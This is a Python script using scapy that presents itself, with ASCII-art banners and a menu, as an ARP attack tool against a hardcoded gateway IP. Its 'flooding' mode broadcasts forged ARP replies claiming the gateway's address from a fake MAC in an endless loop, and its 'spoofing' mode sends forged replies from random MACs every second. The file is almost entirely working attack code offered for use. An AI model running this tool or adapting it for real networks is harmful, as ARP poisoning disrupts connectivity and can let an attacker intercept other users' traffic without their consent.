from scapy.all import *
import time
import random
import os
from colorama import Fore, Back, Style
from scapy.layers.l2 import ARP, Ether

TARGET_IP = "172.16.13.1"  # <- IP (maybe Gateway)
INTERFACE = "wlo1"  # <- Network interface
FAKE_MAC = "de:ad:be:ef:00:01"  # <- Simulate an unknown device

# ---------------- We need to carry out an attack, right? ASCII art is essential to its success. :) ----------------

arp_art = r"""      _       _______     _______         _     _________  _________     _        ______  ___  ____   
     / \     |_   __ \   |_   __ \       / \   |  _   _  ||  _   _  |   / \     .' ___  ||_  ||_  _|  
    / _ \      | |__) |    | |__) |     / _ \  |_/ | | \_||_/ | | \_|  / _ \   / .'   \_|  | |_/ /    
   / ___ \     |  __ /     |  ___/     / ___ \     | |        | |     / ___ \  | |         |  __'.    
 _/ /   \ \_  _| |  \ \_  _| |_      _/ /   \ \_  _| |_      _| |_  _/ /   \ \_\ `.___.'\ _| |  \ \_  
|____| |____||____| |___||_____|    |____| |____||_____|    |_____||____| |____|`.____ .'|____||____| 
                                                                                                      """
flood_art = r"""   _  ________  _____       ___      ___   ______   _    
  / /|_   __  ||_   _|    .'   `.  .'   `.|_   _ `.\ \   
 / /   | |_ \_|  | |     /  .-.  \/  .-.  \ | | `. \\ \  
< <    |  _|     | |   _ | |   | || |   | | | |  | | > > 
 \ \  _| |_     _| |__/ |\  `-'  /\  `-'  /_| |_.' // /  
  \_\|_____|   |________| `.___.'  `.___.'|______.'/_/   
                                                         """

spoof_art = r"""   _  ____      ____  ____  ____   ___        _       ____    ____  _____  _____   _    
  / /|_  _|    |_  _||_   ||   _|.'   `.     / \     |_   \  /   _||_   _|/ ___ `.\ \   
 / /   \ \  /\  / /    | |__| | /  .-.  \   / _ \      |   \/   |    | | |_/___) | \ \  
< <     \ \/  \/ /     |  __  | | |   | |  / ___ \     | |\  /| |    | |   /  __.'  > > 
 \ \     \  /\  /     _| |  | |_\  `-'  /_/ /   \ \_  _| |_\/_| |_  _| |_  |_|     / /  
  \_\     \/  \/     |____||____|`.___.'|____| |____||_____||_____||_____| (_)    /_/   
                                                                                        """

# ------------------------------------------------------------------------------------------------------------------


def flood_attack():

    os.system("clear")
    print(Fore.YELLOW + flood_art + Fore.RESET)
    print(
        Style.BRIGHT
        + Fore.BLACK
        + Back.MAGENTA
        + f"Starting flooding attack -> mac: {FAKE_MAC}"
        + Back.RESET
    )

    ether_layer = Ether(src=FAKE_MAC, dst="ff:ff:ff:ff:ff:ff")
    arp_layer = ARP(
        op=2, pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=TARGET_IP, hwsrc=FAKE_MAC
    )

    packet = ether_layer / arp_layer

    try:
        while True:
            sendp(packet, iface=INTERFACE, verbose=False)
            print(Fore.MAGENTA + ".", end="", flush=True)
            time.sleep(0.05)  # 20 pkt/sec
    except KeyboardInterrupt:
        print(Fore.RED + Back.BLACK + "\nStopped." + Fore.RESET + Back.RESET)


def spoofing_attack():

    os.system("clear")
    print(Fore.YELLOW + spoof_art + Fore.RESET)
    print(Style.BRIGHT + Fore.BLACK + Back.MAGENTA + f"Starting arp spoofing.")

    try:
        while True:
            # Generate a rand mac to alert the system
            rand_mac = "02:00:00:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
            )

            ether_layer = Ether(
                src=rand_mac, dst="ff:ff:ff:ff:ff:ff"
            )  # We should use the correct mac, not the broadcast one
            arp_layer = ARP(op=2, pdst=TARGET_IP, psrc=TARGET_IP, hwsrc=rand_mac)

            packet = ether_layer / arp_layer

            sendp(packet, iface=INTERFACE, verbose=False)

            print(Back.YELLOW + f"Packet sent from {rand_mac}" + Back.RESET)
            time.sleep(1)
    except KeyboardInterrupt:
        print(Back.RED + "\nStopped." + Back.RESET)


if __name__ == "__main__":
    if not TARGET_IP or not INTERFACE:
        print(Back.RED + "Insert IP and Network Interface to start." + Back.RESET)
        exit()

    print(Fore.YELLOW + arp_art + Fore.RESET)
    print("1. Flooding")
    print("2. Spoofing")
    resp = input(
        Style.BRIGHT + Fore.BLACK + Back.YELLOW + "Select -> (1/2): " + Back.RESET
    )

    if resp == "1":
        flood_attack()
    else:
        spoofing_attack()
